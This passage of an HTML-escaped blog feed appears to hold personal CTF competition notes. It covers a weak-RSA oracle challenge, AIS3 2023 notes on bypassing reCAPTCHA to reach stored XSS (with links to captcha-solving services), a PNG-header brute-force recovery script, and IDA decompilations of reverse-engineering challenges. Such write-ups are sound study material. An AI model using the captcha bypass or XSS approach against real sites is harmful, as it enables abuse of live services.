&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> dec &lt;span style="color:#f92672">=&lt;/span> pow(c, d, n)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> long_to_bytes(dec)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;__main__&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p &lt;span style="color:#f92672">=&lt;/span> getPrime(&lt;span style="color:#ae81ff">1024&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> q &lt;span style="color:#f92672">=&lt;/span> getPrime(&lt;span style="color:#ae81ff">1024&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> n &lt;span style="color:#f92672">=&lt;/span> p &lt;span style="color:#f92672">*&lt;/span> q
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> phi &lt;span style="color:#f92672">=&lt;/span> (p &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> (q &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> e &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> phi &lt;span style="color:#f92672">%&lt;/span> e &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> : 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> d &lt;span style="color:#f92672">=&lt;/span> pow(e, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>, phi)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>p&lt;span style="color:#e6db74">=}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>q&lt;span style="color:#e6db74">=}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>n&lt;span style="color:#e6db74">=}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>e&lt;span style="color:#e6db74">=}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;FLAG: &amp;#34;&lt;/span>, encrypt(FLAG, e, n))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">3&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> c &lt;span style="color:#f92672">=&lt;/span> int(input(&lt;span style="color:#e6db74">&amp;#34;Any message for me?&amp;#34;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> m &lt;span style="color:#f92672">=&lt;/span> decrypt(c, d, n)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;How beautiful the message is, it makes me want to destroy it .w.&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> new_m &lt;span style="color:#f92672">=&lt;/span> long_to_bytes(bytes_to_long(m) &lt;span style="color:#f92672">^&lt;/span> bytes_to_long(os&lt;span style="color:#f92672">.&lt;/span>urandom(&lt;span style="color:#ae81ff">8&lt;/span>)))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print( &lt;span style="color:#e6db74">&amp;#34;New Message: &amp;#34;&lt;/span>, encrypt(new_m, e, n) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;?&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>AIS3 Pre-Exam 2023</title><link>https://bernie6401.github.io/docs/security/competition/ais3-pre-exam-2023/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/ais3-pre-exam-2023/</guid><description>&lt;h1 id="ais3-pre-exam-2023">
 AIS3 Pre-Exam 2023
 &lt;a class="anchor" href="#ais3-pre-exam-2023">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-eof2023">
 tags: &lt;code>CTF&lt;/code> &lt;code>EOF2023&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-eof2023">#&lt;/a>
&lt;/h6>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="web">
 Web
 &lt;a class="anchor" href="#web">#&lt;/a>
&lt;/h2>
&lt;h3 id="e-portfolio-baby">
 E-Portfolio baby
 &lt;a class="anchor" href="#e-portfolio-baby">#&lt;/a>
&lt;/h3>
&lt;h4 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h4>
&lt;p>直接用Burp Suite可以繞過reCAPTCHA，而且About Guest的內容會被完整的render出來達到XSS&lt;/p>
&lt;h3 id="login-panel">
 Login Panel
 &lt;a class="anchor" href="#login-panel">#&lt;/a>
&lt;/h3>
&lt;h4 id="recon-1">
 Recon
 &lt;a class="anchor" href="#recon-1">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>&lt;a href="https://www.readfog.com/a/1640970212456108032">我又找到了一個破解谷歌驗證碼的新方案！&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://yescaptcha.com/dashboard.html">yescaptcha&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="reverse">
 Reverse
 &lt;a class="anchor" href="#reverse">#&lt;/a>
&lt;/h2>
&lt;h2 id="pwn">
 Pwn
 &lt;a class="anchor" href="#pwn">#&lt;/a>
&lt;/h2>
&lt;h3 id="simply-pwn">
 Simply Pwn
 &lt;a class="anchor" href="#simply-pwn">#&lt;/a>
&lt;/h3>
&lt;h4 id="recon-2">
 Recon
 &lt;a class="anchor" href="#recon-2">#&lt;/a>
&lt;/h4>
&lt;ol>
&lt;li>&lt;code>checksec&lt;/code>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ checksec pwn
[*] Checking for new versions of pwntools
 To disable this functionality, set the contents of /home/sbk6401/.cache/.pwntools-cache-3.7/update to &amp;#39;never&amp;#39; (old way).
 Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
 [update]
 interval=never
[*] You have the latest version of Pwntools (4.9.0)
[*] &amp;#39;/home/sbk6401/CTF/AIS3-Pre-Exam/PWN/Simply Pwn/pwn&amp;#39;
 Arch: amd64-64-little
 RELRO: Partial RELRO
 Stack: Canary found
 NX: NX disabled
 PIE: No PIE (0x400000)
 RWX: Has RWX segments
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;h2 id="misc">
 Misc
 &lt;a class="anchor" href="#misc">#&lt;/a>
&lt;/h2>
&lt;h3 id="welcome">
 Welcome
 &lt;a class="anchor" href="#welcome">#&lt;/a>
&lt;/h3>
&lt;p>縮小檔案就看的到flag了
Flag: &lt;code>AIS3{WELCOME-TO-2023-PRE-EXAM-&amp;amp;-MY-FIRST-CTF}&lt;/code>&lt;/p></description></item><item><title>Background</title><link>https://bernie6401.github.io/docs/security/practice/nisra/misc/nisra---%E7%9C%8B%E4%B8%8D%E8%A6%8B%E7%9A%84%E5%9C%B0%E6%96%B9/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/nisra/misc/nisra---%E7%9C%8B%E4%B8%8D%E8%A6%8B%E7%9A%84%E5%9C%B0%E6%96%B9/</guid><description>&lt;h1 id="nisra---看不見的地方">
 NISRA - 看不見的地方
 &lt;a class="anchor" href="#nisra---%e7%9c%8b%e4%b8%8d%e8%a6%8b%e7%9a%84%e5%9c%b0%e6%96%b9">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/uwox6r5hQ6St_8G-4mv1_g">advanced-potion-making:two::+1:&lt;/a>&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這題出的不錯，我用了所有方法都沒看到甚麼奇怪的東西，除了pngcheck&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ pngcheck flag.png
flag.png CRC error in chunk IHDR (computed 68ff0ded, expected 8c5880da)
ERROR: flag.png 
&lt;/code>&lt;/pre>&lt;p>代表檔案可能有一些問題
原圖：
&lt;img src="https://hackmd.io/_uploads/SkwQ2IPu3.png" alt="" />&lt;/p>
&lt;h2 id="exploit---recover-png-file">
 Exploit - Recover PNG File
 &lt;a class="anchor" href="#exploit---recover-png-file">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>參考&lt;a href="https://zhuanlan.zhihu.com/p/599657891">UP主的腳本&lt;/a>，可以直接寫出長寬&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!" data-lang="python!">import zlib
import struct
import sys

filename = sys.argv[1]
with open(filename, &amp;#39;rb&amp;#39;) as f:
 all_b = f.read()
 crc32key = int(all_b[29:33].hex(),16)
 data = bytearray(all_b[12:29])
 n = 4095
 for w in range(n): 
 width = bytearray(struct.pack(&amp;#39;&amp;gt;i&amp;#39;, w))
 for h in range(n):
 height = bytearray(struct.pack(&amp;#39;&amp;gt;i&amp;#39;, h))
 for x in range(4):
 data[x+4] = width[x]
 data[x+8] = height[x]
 crc32result = zlib.crc32(data)
 if crc32result == crc32key:
 print(&amp;#34;寬為：{}(hex), {}(int)&amp;#34;.format(width.hex(), int(width.hex(), 16)))
 print(&amp;#34;高為：{}(hex), {}(int)&amp;#34;.format(height.hex(), int(height.hex(), 16)))
 exit(0)
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ python exp.py flag.png
寬為：00000258(hex), 600(int)
高為：00000148(hex), 328(int)
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://hackmd.io/_uploads/rkLuiLwuh.png" alt="" />
可以看得出來高的數值不一樣&lt;/p></description></item><item><title>BalsnCTF 2023</title><link>https://bernie6401.github.io/docs/security/competition/balsnctf-2023/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/balsnctf-2023/</guid><description>&lt;h1 id="balsnctf-2023">
 BalsnCTF 2023
 &lt;a class="anchor" href="#balsnctf-2023">#&lt;/a>
&lt;/h1>
&lt;h2 id="reverse">
 Reverse
 &lt;a class="anchor" href="#reverse">#&lt;/a>
&lt;/h2>
&lt;h3 id="lucky">
 Lucky
 &lt;a class="anchor" href="#lucky">#&lt;/a>
&lt;/h3>
&lt;h4 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h4>
&lt;p>:::spoiler IDA Main Function&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">__int64 main_fn()
{
 __int64 idx; // r15
 int v1; // ebp
 __int64 v2; // rbx
 unsigned __int64 v3; // r14
 int v4; // r9d
 int v5; // r9d
 char v6; // al
 __int64 v7; // rdx
 unsigned int v9; // [rsp+Ch] [rbp-9Ch] BYREF
 char v10[32]; // [rsp+10h] [rbp-98h] BYREF
 __int128 user_input[2]; // [rsp+30h] [rbp-78h] BYREF
 __int64 v12; // [rsp+50h] [rbp-58h]
 char v13; // [rsp+58h] [rbp-50h]
 unsigned __int64 v14; // [rsp+68h] [rbp-40h]

 idx = 10000000000000000LL;
 v1 = 0;
 v14 = __readfsqword(0x28u);
 v2 = sub_40C2B0(&amp;#34;/dev/urandom&amp;#34;, &amp;amp;unk_498004);
 do
 {
 sub_40C3B0(&amp;amp;v9, 4uLL, 1LL, v2);
 v3 = v9 % 100000000uLL;
 sub_40C3B0(&amp;amp;v9, 4uLL, 1LL, v2);
 v1 -= (v3 * v3 + v9 % 100000000uLL * (v9 % 100000000uLL) &amp;gt; 9999999999999999LL) - 1;
 --idx;
 }
 while ( idx );
 sub_44A050(v10, 1u, 30LL, &amp;#34;%lu&amp;#34;, 4 * v1 - 0x4F430000, v4);
 v13 = 0;
 v6 = 0x73;
 v12 = 0LL;
 memset(user_input, 0, sizeof(user_input));
 while ( 1 )
 {
 v7 = idx &amp;amp; 0xF;
 *(user_input + idx++) = v10[v7] ^ v6;
 if ( idx == 40 )
 break;
 v6 = byte_498040[idx];
 }
 if ( LOBYTE(user_input[0]) == &amp;#39;B&amp;#39; &amp;amp;&amp;amp; *(user_input + 1) == &amp;#39;NSLA&amp;#39; &amp;amp;&amp;amp; BYTE5(user_input[0]) == &amp;#39;{&amp;#39; &amp;amp;&amp;amp; HIBYTE(v12) == &amp;#39;}&amp;#39; )
 sub_44A130(1, &amp;#34;Lucky! flag is %s\n&amp;#34;, user_input, byte_498040, user_input, v5);
 else
 (sub_40C4B0)(&amp;#34;Not so lucky ...&amp;#34;, 1LL, v7, byte_498040, user_input);
 if ( v14 != __readfsqword(0x28u) )
 (sub_44A220)();
 return 0LL;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>CGGC 2023 初賽</title><link>https://bernie6401.github.io/docs/security/competition/cggc-2023-%E5%88%9D%E8%B3%BD/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/cggc-2023-%E5%88%9D%E8%B3%BD/</guid><description>&lt;h1 id="cggc-2023-初賽">
 CGGC 2023 初賽
 &lt;a class="anchor" href="#cggc-2023-%e5%88%9d%e8%b3%bd">#&lt;/a>
&lt;/h1>
&lt;ul>
&lt;li>隊名: 王凡補習班&lt;/li>
&lt;li>名次
&lt;img src="https://hackmd.io/_uploads/ryb_H_FrT.png" alt="圖片" />
這一次參賽雖然打出來的不多，但重點還是有學到很多東西，感謝@davidchen學長帶我飛，我覺得互相交流之後的這種隱形的貢獻也是很重要的&lt;/li>
&lt;/ul>
&lt;h2 id="gaoyi">
 GaoYi
 &lt;a class="anchor" href="#gaoyi">#&lt;/a>
&lt;/h2>
&lt;h3 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h3>
&lt;p>:::spoiler IDA main function&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">__cdecl&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>envp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&amp;#34;+&amp;#34; TO EXPAND]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> setvbuf(stdout, &lt;span style="color:#ae81ff">0LL&lt;/span>, &lt;span style="color:#ae81ff">2LL&lt;/span>, &lt;span style="color:#ae81ff">0LL&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(TITLE);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Welcome to the Charitable Lag Vegas!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Anyone can participate with three million US dollars.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;You play with 52 cards with (S)pades, (C)lub, (H)earts, (D)iamond.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;[+] Game 1: Predict the first 8 cards I draw in exact order.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;[+] Input example: &lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">C8&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v47 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf((&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)&lt;span style="color:#e6db74">&amp;#34;Card %c: &amp;#34;&lt;/span>, i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">49&lt;/span>, v3, v4, v5, v6, flag[&lt;span style="color:#ae81ff">0&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fgets(&lt;span style="color:#f92672">&amp;amp;&lt;/span>input[&lt;span style="color:#ae81ff">32&lt;/span> &lt;span style="color:#f92672">*&lt;/span> i], &lt;span style="color:#ae81ff">32LL&lt;/span>, stdin);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)isACard((&lt;span style="color:#66d9ef">__int64&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>input[&lt;span style="color:#ae81ff">32&lt;/span> &lt;span style="color:#f92672">*&lt;/span> i]) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">--&lt;/span>v47;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( j &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; j &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>j )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span>)j_strlen_ifunc(&lt;span style="color:#f92672">&amp;amp;&lt;/span>input[&lt;span style="color:#ae81ff">32&lt;/span> &lt;span style="color:#f92672">*&lt;/span> j]) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v7 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">224&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;H&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v8 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">!&lt;/span>j &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;0&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v9 &lt;span style="color:#f92672">=&lt;/span> v8 &lt;span style="color:#f92672">+&lt;/span> v7;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v10 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">32&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;S&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v11 &lt;span style="color:#f92672">=&lt;/span> v10 &lt;span style="color:#f92672">+&lt;/span> v9;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v12 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">!&lt;/span>j &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;H&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v13 &lt;span style="color:#f92672">=&lt;/span> v12 &lt;span style="color:#f92672">+&lt;/span> v11;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v14 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">33&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;2&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v15 &lt;span style="color:#f92672">=&lt;/span> v14 &lt;span style="color:#f92672">+&lt;/span> v13;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v16 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">129&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;7&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v17 &lt;span style="color:#f92672">=&lt;/span> v16 &lt;span style="color:#f92672">+&lt;/span> v15;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v18 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">64&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;C&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v19 &lt;span style="color:#f92672">=&lt;/span> v18 &lt;span style="color:#f92672">+&lt;/span> v17;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v20 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">96&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;S&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v21 &lt;span style="color:#f92672">=&lt;/span> v20 &lt;span style="color:#f92672">+&lt;/span> v19;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v22 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">192&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;H&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v23 &lt;span style="color:#f92672">=&lt;/span> v22 &lt;span style="color:#f92672">+&lt;/span> v21;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v24 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">65&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;8&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v25 &lt;span style="color:#f92672">=&lt;/span> v24 &lt;span style="color:#f92672">+&lt;/span> v23;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v26 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">97&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;5&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v27 &lt;span style="color:#f92672">=&lt;/span> v26 &lt;span style="color:#f92672">+&lt;/span> v25;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v28 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">160&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;S&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v29 &lt;span style="color:#f92672">=&lt;/span> v28 &lt;span style="color:#f92672">+&lt;/span> v27;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v30 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">128&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;S&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v31 &lt;span style="color:#f92672">=&lt;/span> v30 &lt;span style="color:#f92672">+&lt;/span> v29;
